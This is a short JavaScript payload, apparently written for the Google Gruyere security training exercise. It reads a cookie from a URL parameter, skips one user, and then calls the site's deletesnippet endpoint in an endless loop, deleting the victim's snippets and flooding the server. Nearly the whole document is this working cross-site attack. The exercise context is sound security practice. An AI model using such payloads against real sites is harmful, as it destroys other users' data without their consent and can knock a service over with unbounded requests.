const urlParams = new URLSearchParams(queryString);
const cookie = urlParams.get('c')

if (cookie.split('=')[1].split("|")[1] == "dede") return

while(1) {
    fetch("https://google-gruyere.appspot.com/349021072774187085148199131883529995693/deletesnippet?index=0")
}